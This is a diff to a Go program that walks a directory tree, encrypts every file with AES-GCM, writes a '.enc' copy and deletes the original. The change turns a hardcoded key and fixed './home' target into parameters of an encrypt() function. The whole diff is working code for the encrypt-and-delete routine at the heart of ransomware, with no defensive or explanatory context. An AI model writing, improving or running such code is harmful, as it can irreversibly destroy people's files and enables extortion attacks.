@@ -1,18 +1,18 @@
 package main
 
 import (
-"fmt"
-"crypto/aes"
-"crypto/cipher"
-"path/filepath"
-"os"
-"io"
-"crypto/rand"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"fmt"
+	"io"
+	"os"
+	"path/filepath"
 )
 
-func main() {
+func encrypt(root string, passphrase string) {
 	// Initialize AES in GCM mode
-	key := []byte("thisisthesecretkeythatwillbeused")
+	key := []byte(passphrase)
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		panic("error while setting up aes")
@@ -23,7 +23,7 @@ func main() {
 	}
 
 	// looping through target files
-	filepath.Walk("./home", func (path string, info os.FileInfo, err error) error {
+	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 		// skip if directory
 		if !info.IsDir() {
 			// encrypt the file
@@ -38,7 +38,7 @@ func main() {
 				encrypted := gcm.Seal(nonce, nonce, original, nil)
 
 				// write encrypted contents
-				err = os.WriteFile(path + ".enc", encrypted, 0666)
+				err = os.WriteFile(path+".enc", encrypted, 0666)
 				if err == nil {
 					os.Remove(path) // delete the original file
 				} else {
@@ -49,5 +49,5 @@ func main() {
 			}
 		}
 		return nil
-	});
+	})
 }
